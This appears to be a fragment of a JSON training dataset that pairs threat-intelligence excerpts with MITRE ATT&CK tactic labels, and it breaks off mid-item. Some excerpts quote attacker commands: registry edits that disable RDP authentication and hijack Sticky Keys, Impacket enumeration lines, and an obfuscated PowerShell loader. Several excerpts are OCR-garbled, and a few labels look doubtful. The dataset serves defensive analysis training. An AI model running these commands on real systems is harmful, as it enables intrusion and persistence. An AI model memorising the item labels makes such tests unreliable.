        "input": "Described attack activity: 29 days after initial access, the threat actor started to deploy the Dagon Locker ransomware in the environment.\nThe threat actor distributed Dagon Locker ransomware on multiple systems across the environment through the custom PowerShell script, AWScollector, and the locker module described earlier.\nThe following PowerShell command was run from a domain controller.\nTo prevent data recovery and stop multiple services, two different files called sysfunc.cmd were dropped into the systems.\nSubsequently the execution of the locker PowerShell module, the ransomware, was deployed to different systems.\nAll systems were left with the below message:\nDagon Locker left on the test workstation also a log file related to its execution calledsysfunc.dll.log.",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Cadet Blizzard conducts lateral movement with valid network credentials obtained from credential harvesting. To conduct lateral movement more efficiently, Cadet Blizzard typically uses modules from the publicly available Impacket framework. While this framework is generically utilized by multiple actors, preferential execution of patterns of commands may allow for more precision profiling of Cadet Blizzard operations: \nPowerShell get-volume to enumerate the volume of a device cmd.exe /Q/c powershe1l get-volume 1>1\\127.0.0.1\\ADMIN\\$ \nCopying critical registry hives that contain password hashes and computer information ",
        "output": "lateral movement",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Based on our observations over the past two months, these attacks originate from 163[.]123[.]142[.]210 and 185[.]17[.]0[.]19. The attackers have targeted an HTTP URI, \"wls-wsat/CoordinatorPortType,\" which belongs to an Oracle Weblogic server. The corresponding traffic capture is shown in Figure 2.\nThe attack attempts to download a PowerShell named \"bypass.ps1\". The partial PowerShell script, \"bypass.ps1,\" shown in Figure 3, has had its main code and strings encoded to make it harder to be detected by AntiVirus solutions. After three rounds of adding constants, reversing, and Based64 decoding, we finally uncovered clear text. The first variable, \"$c\", contains ScrubCrypt. The detail of this variable will be discussed in the next section. The rest of the variables, from \"$d\" to \"$f\", are for AMSI and ETW evasion, which is executed by \"iex\" at the end of the attack.\nAfter decoding \"$c\", we find the script for the next step, shown in Figure 4. It has another Base64-encoded code saved in the victim's temp folder with the filename \"OracleUpdate.bat\" to masquerade as a normal system file. Once the fake \"update\" file is decoded and saved, it executes with the Windows style \"hidden\" to silently load ScrubCrypt.",
        "output": "initial access",
        "source": "Fortinet"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: During the intrusion, the threat actor created multiple scheduled tasks to achieve persistence. This persistence technique was abused on the beachhead host and each host moved to laterally during the first day.\nHowever, some of them had mistakes and therefore were not correctly working.\nFor example, in the following task, the threat actor didn't specify the \"\\\" between \"C:\" and the executable name.\nWhile some tasks used the 'ONSTART' option to enable persistence after reboot, some used a time frame to execute every 720 minutes. For example, on a server the threat actor dropped a BAT file name UpdateEdge.bat and subsequently created two scheduled tasks using this option.\nTo ensure persistence on the beachhead host and three servers, the threat actor added an entry in the Winlogon\\Userinit registry key to ensure the execution of UpdateEdge.bat whenever a user logs into the systems.",
        "output": "persistence",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: To achieve collection of various directories on multiple hosts, the threat actors used the dir command through the administrative share c$ and redirected the output to a file text named listing.txt.\nIn addition, multiple text files were also created to store the output of various discovery commands and scripts.",
        "output": "collection",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: ESET Research has traced the origins of the SpyLoan scheme back to 2020. At that time, such apps presented only isolated cases that didn't catch the attention of researchers; however, the presence of malicious loan apps kept growing and ultimately, we started to spot them on Google Play, the Apple App Store, and on dedicated scam websites. Screenshots of one such example are shown in Figure 3 and Figure 4. This multiplatform approach maximized their reach and increased the chances of user engagement, although these apps were later taken down from both official app stores.\nAt the beginning of 2022, ESET reached out to Google Play to notify the platform about more than 20 malicious loan apps that had over 9 million collective downloads. After our intervention, the company deleted these apps from its platform. Security company Lookout identified 251 Android apps on Google Play and 35 iOS apps on the Apple App Store that exhibited predatory behavior. According to Lookout, they had been in contact with Google and Apple regarding the identified apps and in November 2022 published ablogpostabout these apps. Google already identified and took down the majority of the malicious loan apps ahead of Lookout's research publication, with two of the identified apps being removed from Google Play by the developer. Collectively these apps across Google Play had over 15 million downloads; Apple also took down the identified apps.\nAccording to ESET telemetry, SpyLoan detections started to rise again in January 2023 and have continued to grow since then even more across unofficial third-party app stores, Google Play, and websites; we outlined this growth in theESET Threat Report H1 2023.\nIn their2022 security summary, Google described how the company kept Android and Google Play users safe by rolling out new requirements for personal loan apps in several regions. As documented, over the past three years, the situation has evolved and Google Play has made several changes to its personal loan app policies  with country-specific requirements in India, Indonesia, Philippines, Nigeria, Kenya, Pakistan, and Thailand  and has unpublished many malicious loan apps.\nTo lure victims, the perpetrators actively promote these malicious apps with SMS messages and on popular social media channels such as Twitter, Facebook, and YouTube. By leveraging this immense user base, the scammers aim to attract unsuspecting victims who are in need of financial assistance.\nAlthough this scheme is not utilized in every SpyLoan app we analyzed, another alarming aspect of some SpyLoan apps is the impersonation of reputable loan providers and financial services by misusing the names and branding of legitimate entities. To help raise awareness among potential victims, some legitimate financial services even have warned about SpyLoan apps on social media, as can be seen in Figure 5.",
        "output": "initial access",
        "source": "Weblive"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Exfiltration for FindPOS takes place via HTTP POST requests. A number of hardcoded domains are configured for each sample, often varying between FindPOS variants. HTTP POST requests are made every 120 seconds (2 minutes). In the event any data has been discovered, such as track data or keystroke data, this data is included. An example request from version 5.80 is shown below:\nAs we can see, a number of POST variables are included in each request:\nAn example of decoding the 'uinfo' parameter can be seen below:\n>>> import base64>>> base64.b64decode(\"Sk9TSC1QQyBAIGpvc2gtUENcam9zaA==\")'JOSH-PC @ josh-PC\\\\josh'\nKeystroke data and track data is obfuscated using a combination of Base64 encoding and a single-byte XOR encryption. Decoding this data can be seen below:\n>>> import base64>>> raw = \"\">>> for s in base64.b64decode(\"HxkaGxgfGhodGhoaGhsTGxcbHxoSGxobGhMbGBkeHxwdEhMaGxU=\"):>>>     raw += chr(ord(s) ^ 0x2a)>>> print raw5301250070000191=15081010912345678901?\nIn addition to data exfiltration, FindPOS added the ability to download/execute further malware. Upon sending an exfiltration request, should the server respond with a 0x1 or 0x4 byte, followed by a URL, this file will be downloaded and subsequently executed.\nThe file is downloaded to a temporary folder, with the file itself prefixed by 'BN'. This downloaded file is executed via a call toCreateProcessA. In the event the file cannot be properly downloaded or executed, it is deleted from disk.",
        "output": "exfiltration",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: We analyzed data on 131 victims that were compromised by Seedworm's Powermud backdoor from late September to mid-November 2018.\nObserved Seedworm victims were located primarily in Pakistan and Turkey, but also in Russia, Saudi Arabia, Afghanistan, Jordan, and elsewhere. Additionally, the group compromised organizations in Europe and North America that have ties to the Middle East.\nAdditionally, during our analysis of Powermud victims, we were able to identify the probable industry sector for 80 of the 131 unique victims. The telecommunications and IT services sectors were the main targets. Entities in these sectors are often \"enabling victims\" as telecommunications providers or IT services agencies and vendors could provide Seedworm actors with further victims to compromise. Successfully compromising victims in these two industries provides additional clues about the sophistication and skills of the Seedworm group.\nThe next most common group of victims was in the oil and gas sector. All 11 victims in this group belong to one Russian firm that is active in the Middle East. Only one of these 11 victims was physically located in Russia; the rest were spread out across North America, the Middle East, Africa, and Asia.\nUniversities and embassies were the next most common targets. The universities were in the Middle East and the embassies were primarily based in Europe representing Middle East countries. Two major non-governmental organizations (NGOs) were also compromised; we identified seven victims who worked within these global public health organizations.\nSymantec has notified the appropriate public and private sector partners regarding Seedworm's latest targets, tools and techniques..",
        "output": "other",
        "source": "Symentec"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actors used native Windows binaries to enumerate the exploited server in an automated fashion. They executed commands such as:\nThese discovery tasks like the rest of the activity observed from this threat actor was executed via the web shell.\nThey used the PowerShell module Get-WmiObject to collect the name and IP address of the domain controller.\nAdditionally, we saw threat actors retrieving an email address from the compromised exchange server using the below command. This was likely done as a test.",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In its mildest scenario, disassembled junk code can waste your time and effort. In its worst scenario, it \n2025/5/7 11:35 \ncan make you say things about the data you're analyzing that aren't true. In this post, we have learned to spot disassembled junk by recognizing and understanding out-of-place code. We broke the out-of-place code down into categories for the most common cases and discussed what they mean, why they occur frequently, and why they shouldn't. By learning these indicators, you can easily spot disassembled junk and save yourself time and maintain your reputation. \nPosted in Threat Intelligence-Security & Identity ",
        "output": "other",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1059: Command and Scripting Interpreter   \nT1059.001: PowerShell   \nT1059.003: Windows Command Shell   \nT1059.005: Visual Basic   \nT1059.007: JavaScript   \nT1204.001: Malicious Link   \nT1204.002: Malicious File ",
        "output": "execution",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Before exfiltration, the data collected from LDAP discovery was written out to an XML file.\nThreat actors also dropped and executed a PowerShell script using theirtemp.ps1C2 script:\nThesc.ps1file contained PowerShell code to capture a screenshot of the system. The screenshots were taken upon the execution of this PowerShell script and then they were saved in the same directory assc.pngfiles.\nA scheduled task namedMicrosoftEdgeUpdateTaskMachineUCwas created by the threat actors. The program executed by this task was a keylogger. This keylogger relied on the files module.exe, module.ahk, and readkey.ps1.The file t.xml contained the task used to execute these files.\nThe executable, module.exe, is a renamed binary of AutoHotkey. This is one of the ways in which you can execute an AutoHotkey (AHK) script.\nThe actual keylogger is the AHK script, module.ahk.\nNavigating through the AHK script, we discovered artifacts of acquiring the keyboard layout and capturing pressed keys. In addition, we notice there is a function namedUpdateRegthat accepts a text parameter. This registry key is also found within the readkey.ps1 script and turns out to be where the keylogger saved captured keystrokes.\nThereadkey.ps1file grabbed the keystrokes from theKeypressValueregistry key, XOR's the data, and saves it to a log (logFileuyovaqv.bin) file.\nThe threat actors then made a cab file out of the collected keystrokes in preparation for exfiltration.",
        "output": "collection",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: INDUSTROYER.V2 first sends control function messages, which are contained within an APCI frame. The first control message is a Test Frame (TESTFR). The malware sends a TESTFR ACT to the remote station which verifies an established connection. If one exists, a remote station responds with a corresponding TESTFR CON. \nNext, the malware opens a data transfer channel with the remote station using a subsequent control message type of Start Data Transfer (STARTDT). By default, data transfer is not enabled on an active connection between a control station and remote station. Therefore, the malware sends a STARTDT ACT to activate a data transfer channel and a remote station sends a corresponding STARTDT CON, to confirm a successful activation. \nWith data transfer enabled, the malware utilizes an ASDU frame to send subsequent commands to the remote station. ASDU messages, also known as telegrams, are a set of application functions defined by IEC-104 to monitor and control remote stations. Further information describing the ASDU frame is available for reference. \nThe malware sends a General Interrogation command, which allows it to obtain the current status of monitored digital and analog signals of the remote station. The malware then uses embedded ASDU data entries to craft a specific command to modify the target's IOA to either ON or OFF. \nThese commands are crafted using options defined within its configuration and the individual ASDU data entry. For example, in the configuration we   \nextracted from sample   \n7c05da2e4612fca213430b6c93e76b06 (presented in Figure 2) the first ASDU data entry is: \n1104 0 0 0 1 1 \nBased on configuration entry 15 (OFF state), entry 16 (Disable Change option), and its ASDU entry values (described in Table 2), the malware crafts an ASDU packet with the following characteristics: \nInformation Object Address: 1104   \nASDU message type: C-DC_NA_1 (Double   \nCommand)   \nASDU command type: Execute   \nSet state value: OFF \nThe ASDU message is shown in decoded network traffic in Figure 4. \nFor each targeted remote station in a configuration entry, the malware iterates through corresponding ASDU data entries, crafting specified telegrams, and sends it to the remote station. The malware's configuration settings may direct it to craft an additional ASDU message, which inverts the ON/OFF state in a command and sends this additional message to the remote station's IOA. \nA high-level description of the communication sequence is the following: \n1. Send Test Frame messages to verify an established connection   \n2. Send Start Data Transfer messages to open a data transfer channel   \n3. Send a General Interrogation command retrieving the status of the remote station \n4. Send crafted Single or Double command types to modify the state of the remote station's IOA \nFigure 5 illustrates the described message sequence, captured between INDUSTROYER.V2 and a lab emulated IEC-104 remote station. It displays the initial TESTFR, STARTDT, and Interrogation commands, followed by the crafted ASDU commands delivered to specific remote station IOAs. \nThe detailed nature of how a specific remote station is targeted, down to the unique IOAs and the state each IOA must be modified to create an intended effect, demonstrates a comprehensive   \nunderstanding of, or visibility into the victim   \nenvironment. \nWe note that although the IOAs targeted by the malware can provide important context to the actor's precise intent, IOA mappings often differ between manufacturers, devices, and even users. For this reason, accurate interpretation of the \nINDUSTROYER.V2: Old Malware Learns New Tricks | Mandiant | Google Cloud Blog actions intended by the actor requires additional knowledge about the targeted assets. \nWhile at this moment we do not have such information, we explored possible IOA matches based on publicly available documentation about specific products. For example, knowing that ABB RTU's and relays are heavily deployed in the targeted region we performed open source analysis. In our earlier example we observed an IOA equivalent to 1104, which we then mapped to public product documentation from an ABB Distribution Recloser Relay corresponding to \"50BFT:InStr status\". \nIn this status, 50 is the ANSI number for circuit breaker, which is how relay elements are numbered when setting a protection relay. Then 50BFT stands for circuit breaker failure protection. We provide an appendix illustrating additional mapping of IOAs extracted from the configuration of the public INDUSTROYER.V2 sample against the same distribution recloser relay. ",
        "output": "execution",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Petya uses two primary methods to spread across networks:\nExecution across network shares: It attempts to spread to the target computers by copying itself to [COMPUTER NAME]\\\\admin$ using the acquired credentials. It is then executed remotely using either PsExec or the Windows Management Instrumentation Command-line (WMIC) tool. Both are legitimate tools.\nSMB exploits: It attempts to spread using variations of the EternalBlue and EternalRomance exploits.\nPetya checks for the presence of the following processes which are used by Norton products and Symantec Endpoint Protection:\nns.exe\nccsvchost.exe\nIf found, Petya will not use the EternalBlue and EternalRomance exploits to spread.",
        "output": "lateral movement",
        "source": "Symentec"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: While in the environment they injected Cobalt Strike beacons into many processes.\nProcesses with CS beacon injected or running",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Our telemetry indicates a growing number of threat actors are turning to malware-initiated scanning attacks. This article reviews how attackers use infected hosts for malware-based scans of their targets instead of the more traditional approach using direct scans.\nThreat actors have been using scanning methods to pinpoint vulnerabilities in networks or systems for a very long time. Some scanning attacks originate from benign networks likely driven by malware on infected machines. By launching scanning attacks from compromised hosts, attackers can accomplish the following:\nCovering their traces \nBypassing geofencing \nExpanding botnets \nLeveraging the resources of these compromised devices to generate a higher volume of scanning requests compared to what they could achieve using only their own devices\nWe identified several prominent characteristics of scanning behavior, such as an unusually high volume of requests. Using these characteristics and the signatures of known threats, we are able to detect known cases as well as emerging new scanning patterns.\nPalo Alto Networks customers receive protection against malicious scanning activity through ourNext-Generation FirewallandPrisma SASEwithCloud-Delivered Security Servicesenabled, includingAdvanced URL Filtering,Advanced Threat Prevention,Advanced WildFireandDNS Security.\nThePrisma Cloud WAASmodule helps protect cloud-native web applications and API endpoints from scanning attacks.\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response team.",
        "output": "other",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Upon execution of the malicious LNK, ds7002.lnk (MD5: 6ed0020b0851fb71d5b0076f4ee95f3c), the following PowerShell command was executed: \n\\Windows\\System32\\WindowsPowerShell\\v1.0\\p $\\$2k=$ 'JHB0Z3Q9MHgwMDA1ZTJiZTskdmNxPTB4MDAwN rIjtpZiAoLW5vdChUZXN0LVBhdGggJHRiKSl7JG9lP Vudjp0ZW1wIC1GaWx0ZXIgJHRiIC1SZWN1cnNlO2lm 0lPLkRpcmVjdG9yeV06OlNldEN1cnJlbnREaXJlY3R O30kdnp2aT1OZXctT2JqZWN0IElPLkZpbGVTdHJlYW 1JlYWRXcml0ZSc7JG9lPU5ldy1PYmplY3QgYnl0ZVt ZpLlNlZWsoJHB0Z3QsW0lPLlNlZWtPcmlnaW5dOjpC gkb2UsMCwkdmNxLSRwdGd0KTskb2U9W0NvbnZlcnRd cmF5KCRvZSwwLCRvZS5MZW5ndGgpOyR6az1bVGV4dC kdldFN0cmluZygkb2UpO2lleCAkems7'; $\\$123$ 'From ncoding]::ASCII.GetString([Convert]:: $\\$12$ .I \uedda \nThis command included some specific obfuscation, which may indicate attempts to bypass specific detection logic. For example, the use of 'FromBase $^{1}+0\\times40+$ 'String', in place of \nFromBase64String, the PowerShell command used to decode base64. \nThe decoded command consisted of additional PowerShell that read the content of ds7002.lnk from offset 0x5e2be to offset 0x623b6, base64 decoded the extracted content, and executed it as additional PowerShell content. The embedded PowerShell code decoded to the following: \n\\$ptgt $=$ 0x0005e2be;   \n\\$vcq=0x000623b6;   \n\\$tb ${}^{1}={}$ \"ds7002.lnk\";   \nif (-not(Test-Path \\$tb))   \n{   \n\\$oe=Get-ChildItem -Path \\$Env:temp -Filter \\$ if (-not $\\$0e$ )   \n{   \nexit   \n}   \n[IO.Directory]::SetCurrentDirectory(\\$oe.Di }   \n\\$vzvi $=$ New-Object IO.FileStream \\$tb,'Open', \\$oe=New-Object byte[](\\$vcq-\\$ptgt);   \n\\$r=\\$vzvi.Seek( $\\$1$ ptgt,[IO.SeekOrigin]::Begin) \\$r=\\$vzvi.Read(\\$oe,0,\\$vcq-\\$ptgt);   \n\\$oe $=$ [Convert]::FromBase64CharArray(\\$oe,0,\\$ $\\$2k=$ [Text.Encoding]::ASCII.GetString(\\$oe); iex $\\$2K$ ; \nWhen the decoded PowerShell is compared to the older 2016 PowerShell embedded loader (Figure 4), it's clear that similarities still exist. However, the new activity leverages randomized variable and function names, as well as obfuscating strings contained in the script. \nThe PowerShell loader code is obfuscated, but a short de-obfuscated snippet is shown as follows. The decoy PDF and BEACON loader DLL are read from specific offsets within the $\\mathsf{L N K},$ decoded, and their contents executed. The BEACON loader DLL is executed with the export function   \n\"PointFunctionCall\": \\$wabxu $=$ 0x48bd8 - $\\$1$ oufgke   \n$\\$123,456$ $=$ bygtqi \\$gibisec \\$oufgke \\$wabxu $\\$1$ (\\$ENV:PROCESSOR_ARCHITECTURE -eq $\\$1$ (\"AMD64\") $\\$1$ (\"PointFunctionCall\") } ",
        "output": "execution",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Before making the payload persistent on the system, Seduploader may execute local privilege escalation exploits. Since Seduploader's first appearance, the two vulnerabilities described in Table 5 have been exploited, and both were unpatched when first used by the Sednit group. ",
        "output": "privilege escalation",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actor used Rclone to exfiltrate everything in a file share, see 'Exfiltration' for more details. However, there were a few groups of files that were copied to C:\\temp on the beachhead and then deleted about 30 seconds later.",
        "output": "collection",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: So far, we haven't been able to trace back to the initial compromise vector in the campaigns seen in our telemetry. Note that Kaspersky reported in ablogpostthat GoldenJackal used trojanized software and malicious documents for this purpose.",
        "output": "initial access",
        "source": "Weblive"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: After our previous report,@kyleehmkepivoted off of our prior Ryuk report and used the network data to link several of thesedomainswhich we saw in this case.\nBazar:\nReport_Print.exe\n3.137.182.114:443\ncstr3.com\nCobalt Strike:\nservisses.exe",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1059.001 Command and Scripting Interpreter: PowerShell \nT1059.003 Command and Scripting Interpreter: Windows Command Shell \u4e09 T1047 Windows Management Instrumentation ",
        "output": "execution",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: If RDP is enabled, threat actors have a way to move laterally and maintain presence in the environment through tunneling or port forwarding. To mitigate vulnerability to and detect these types of RDP attacks, organizations should focus on both hostbased and network-based prevention and detection mechanisms. For additional information see the FireEye blog post on establishing a baseline for remote desktop protocol. ",
        "output": "other",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actor was seen injecting code into legitimate process winlogon.exe via CreateRemoteThread which can be detected using Sysmon event ID 8.\nDuring the intrusion the threat actor deployed XMrig miner which loaded the driverWinRing0. This driver is deployed to assist the miner in operations and has been in use since at leastversion 5.3.0.",
        "output": "privilege escalation",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Process access to LSASS was observed, likely to dump credentials from a process that was injected with Cobalt Strike. The Granted Access level matches know indicators for Mimikatz with an access value of 0x1010 (4112), as we covered in aprior report.\nWe also observed a Cobalt Strike executable request access level of 0x0040 (64) to LSASS, as well indicating other credential access tools may have been in use by the threat actor.",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: As mentioned, the most observed means of gaining initial access this quarter was phishing, followed by use of valid accounts and exploitation of public facing applications. The increase in phishing attacks this quarter is likely due in part to the robust vishing campaign we observed that accounted for over 60 percent of all phishing engagements. \nPhishing was the top infection vector in Q1 ",
        "output": "initial access",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: ATT&CK Technique: System Owner/User Discovery (T1033) ATT&CK Technique: Account Discovery (T1087) ATT&CK Technique: Domain Trust Discovery (T1482) \nOnce initial access was achieved, several techniques were observed being leveraged to conduct post-compromise discovery and reconnaissance within the environment. We observed attempts to access the backup solution employed in the environment, likely to prevent the organization from successfully recovering without paying the demanded ransom. The \"sudo\" command was used to obtain credentials associated with a commercial backup solution, likely trying to gain access to backups present within the environment. \nsudo -s -k -p [Backup Prompt] whoami \nWe also observed the use of impacket, a common network protocol manipulation tool to enumerate the environment and obtain additional information about the Active Directory configuration in place. This is typically done to identify high-value targets that may be attractive, as attacks attempt to maximize their sphere of influence over as much of the environment as possible prior, eventually deploying ransomware and making their presence known. Below are some examples of the command line syntax used for the performance of this activity. \ncmd.exe /q /c net group enterprise admins /domain 1> \\\\127.0.0.1\\admin\\$\\__[STIRNG] 2>&1 \ncmd.exe /q /c net group domain admins /domain 1> \\\\127.0.0.1\\admin\\$\\__[STRING] 2>&1 \nWe observed enumeration of the domain trust relationships present within the environment. The adversaries used the \"nltest\" command for this purpose. ",
        "output": "discovery",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Trend Micropreviously publisheda number of entries discussing the operations of a China-linked threat actor we track as Earth Lusca. The group, which has been active since at least 2020 and has regularly changed its modus operandi, has been known to launch several different campaigns at the same time.\nDuring our monitoring of this threat actor, we noticed a new campaign that used Chinese-Taiwanese relations as a social engineering lure to infect selected targets. We attribute this campaign to Earth Lusca with high confidence based on the tools, techniques, and procedures (TTPs) we observed in previous research.\nThe attack campaign discussed in this report has likely been active between December 2023 and January 2024, with a file that contained a lure document discussing Chinese-Taiwanese geopolitical issues. This file was created just two days before the Taiwanese national elections and the document seems to be a legitimate document stolen from a geopolitical expert from Taiwan.\nNote that arecent leakof private documents provides a new attribution path to a Chinese company calledI-Soon. We discuss these connections in a separate section in this entry. There is significant overlap between the victims, malware used, and probable location of Earth Lusca and I-Soon. This suggests, at the very least, a significant connection between these groups. Our research is continuing at this time.",
        "output": "other",
        "source": "Trendmicro"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: During the intrusion, no final actions beyond data collection and discovery tasks were observed.",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Once Flax Typhoon can access Windows Management Instrumentation commandline (WMIC), PowerShell, or the Windows Terminal with local administrator privileges, the actor establishes a long-term method of accessing the compromised system using the remote desktop protocol (RDP). To accomplish this, the actor disables network-level authentication (NLA) for RDP, replaces the Sticky Keys binary, and establishes a VPN connection. \nWhen using RDP, NLA requires the connecting user to authenticate to the remote system before a full remote session is established and the Windows sign-in screen is displayed. When NLA is disabled, any user attempting to access the remote system can interact with the Windows sign-in screen before authenticating, which can expose the remote system to malicious actions by the connecting user. Flax Typhoon changes a registry key to disable NLA, allowing them to access the Windows sign-in screen without authenticating, whereupon the actor will use the Sticky Keys shortcut. \nregadd\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\"/vUserAuthentication/d\u03b8/tREG_DwORD/f \nSticky Keys is an accessibility feature in Windows that allows users to press modifier keys (such as Shift, Ctrl, Alt) one at a time instead of simultaneously. It includes a shortcut where the user can press the Shift key five times in succession to launch sethc.exe, the program that manages Sticky Keys. The user can invoke this shortcut at any time, including at the sign-in screen. To take advantage of this feature, Flax Typhoon changes a registry key that specifies the location of sethc.exe. The actor adds arguments that cause the Windows Task Manager to be launched as a debugger for sethc.exe. As a result, when the actor uses the Sticky Keys shortcut on the Windows sign-in screen, Task Manager launches with local system privileges. \nreg add\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\"/v debugger/d taskmgr.exe $^{/\\dag}$ \nAt this stage, Flax Typhoon can access the compromised system via RDP, use the Sticky Keys shortcut at the sign-in screen, and access Task Manager with local system privileges. From there, the actor can launch the Terminal, create memory dumps, and take nearly any other action on the compromised system. The only issue the actor faces with this persistence method is that RDP is most likely running on an internal-facing network interface. Flax Typhoon's solution is to install a legitimate VPN bridge to automatically connect to actor-controlled network infrastructure. ",
        "output": "persistence",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The scheduled task created by the web shell was set to use the principal SID \"S-1-5-18\", or SYSTEM.",
        "output": "privilege escalation",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actor gained initial access using Gootloader malware. Here's a video of the user searching and downloading the malware via the poisoned SEO search.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
